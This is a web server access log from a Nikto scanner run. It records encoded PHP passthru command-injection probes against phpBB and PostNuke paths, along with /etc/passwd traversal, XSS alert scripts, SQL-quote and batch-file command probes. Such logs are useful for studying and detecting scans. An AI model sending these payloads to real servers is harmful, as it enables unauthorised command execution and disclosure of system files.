172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /index.php?name=forums&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527 HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001391)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /postnuke/index.php?name=forums&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527 HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001391)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /postnuke/html/index.php?name=forums&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527 HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001391)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /modules/index.php?name=forums&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527 HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001391)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /phpBB/index.php?name=forums&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527 HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001391)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /forum/index.php?name=forums&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527 HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001391)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /viewtopic.php?t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527 HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001392)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /postnuke/viewtopic.php?t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527 HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001392)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /postnuke/html/viewtopic.php?t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527 HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001392)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /modules/viewtopic.php?t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527 HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001392)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /phpBB/viewtopic.php?t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527 HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001392)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /forum/viewtopic.php?t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527 HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001392)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /index.php?name=PNphpBB2&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527 HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001393)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /index.php?name=Forums&file=viewtopic&t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527 HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001394)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /index.php?name=forums&file=viewtopic&t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527 HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001395)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /viewtopic.php?t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527 HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001396)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /index.php?Nikto=Forums&file=viewtopic&t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527 HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001397)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /postnuke/index.php?Nikto=Forums&file=viewtopic&t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527 HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001397)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /postnuke/html/index.php?Nikto=Forums&file=viewtopic&t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527 HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001397)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /modules/index.php?Nikto=Forums&file=viewtopic&t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527 HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001397)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /phpBB/index.php?Nikto=Forums&file=viewtopic&t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527 HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001397)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /forum/index.php?Nikto=Forums&file=viewtopic&t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527 HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001397)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /index.php?name=Forums&file=viewtopic&t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527 HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001397)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /postnuke/index.php?name=Forums&file=viewtopic&t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527 HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001397)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /postnuke/html/index.php?name=Forums&file=viewtopic&t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527 HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001397)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /modules/index.php?name=Forums&file=viewtopic&t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527 HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001397)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /phpBB/index.php?name=Forums&file=viewtopic&t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527 HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001397)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /forum/index.php?name=Forums&file=viewtopic&t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527 HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001397)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /index.php?Nikto=forums&file=viewtopic&t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527 HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001398)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /postnuke/index.php?Nikto=forums&file=viewtopic&t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527 HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001398)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /postnuke/html/index.php?Nikto=forums&file=viewtopic&t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527 HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001398)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /modules/index.php?Nikto=forums&file=viewtopic&t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527 HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001398)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /phpBB/index.php?Nikto=forums&file=viewtopic&t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527 HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001398)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /forum/index.php?Nikto=forums&file=viewtopic&t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527 HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001398)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /index.php?name=forums&file=viewtopic&t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527 HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001398)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /postnuke/index.php?name=forums&file=viewtopic&t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527 HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001398)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /postnuke/html/index.php?name=forums&file=viewtopic&t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527 HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001398)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /modules/index.php?name=forums&file=viewtopic&t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527 HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001398)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /phpBB/index.php?name=forums&file=viewtopic&t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527 HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001398)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /forum/index.php?name=forums&file=viewtopic&t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527 HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001398)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /viewtopic.php?t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527 HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001399)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /postnuke/viewtopic.php?t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527 HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001399)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /postnuke/html/viewtopic.php?t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527 HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001399)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /modules/viewtopic.php?t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527 HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001399)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /phpBB/viewtopic.php?t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527 HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001399)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /forum/viewtopic.php?t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527 HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001399)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /index.php?name=PNphpBB2&file=viewtopic&t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527 HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001400)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /upload.cgi+ HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001405)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /server-status HTTP/1.1" 403 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001406)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /?PageServices HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001407)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /?wp-cs-dump HTTP/1.1" 302 477 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001408)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /cfdocs.map HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001409)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /publisher/ HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001410)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /cgi-bin/pfdisplay.cgi?../../../../../../etc/passwd HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001413)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /counter/1/n/n/0/3/5/0/a/123.gif HTTP/1.1" 404 521 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001417)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /iissamples/exair/search/search.asp HTTP/1.1" 404 524 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001418)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /../webserver.ini HTTP/1.1" 400 485 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001420)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET / HTTP/1.1" 302 479 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001421)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /na_admin/ HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001422)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET / HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001423)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET / HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001424)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /cpqlogin.htm HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001425)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /cpqlogin.htm HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001426)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET / HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001427)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET / HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001428)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET / HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001429)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET / HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001430)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET / HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001431)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET / HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001432)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET / HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001433)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET / HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001434)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET / HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001435)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET / HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001436)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET / HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001437)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET / HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001438)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET / HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001439)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET / HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001441)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET / HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001442)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET / HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001443)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET / HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001444)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET / HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001445)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET / HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001446)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /main_page.php HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001447)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET / HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001448)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /cpanel/ HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001449)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /shopexd.asp?catalogid='42 HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001450)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /shopping/diag_dbtest.asp HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001451)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /_vti_bin/fpcount.exe/ HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001452)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /forum/index.php?method=&lt;script&gt;alert('Vulnerable')&lt;/script&gt; HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001453)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /zorum/index.php?method=&lt;script&gt;alert('Vulnerable')&lt;/script&gt; HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001454)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /wwwboard/passwd.txt HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001455)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /login/sm_login_screen.php?error=\\\"><script>alert('Vulnerable')</script> HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001456)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /login/sm_login_screen.php?uid=\\\"><script>alert('Vulnerable')</script> HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001457)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /SPHERA/login/sm_login_screen.php?error=\\\"><script>alert('Vulnerable')</script> HTTP/1.1" 404 523 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001458)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /SPHERA/login/sm_login_screen.php?uid=\\\"><script>alert('Vulnerable')</script> HTTP/1.1" 404 523 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001459)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /acart2_0/signin.asp?msg=<script>alert(\\\"test\\\")</script> HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001460)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /ows-bin/perlidlc.bat?&dir HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001461)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /photo/ HTTP/1.1" 404 497 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001462)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /photodata/ HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001463)"
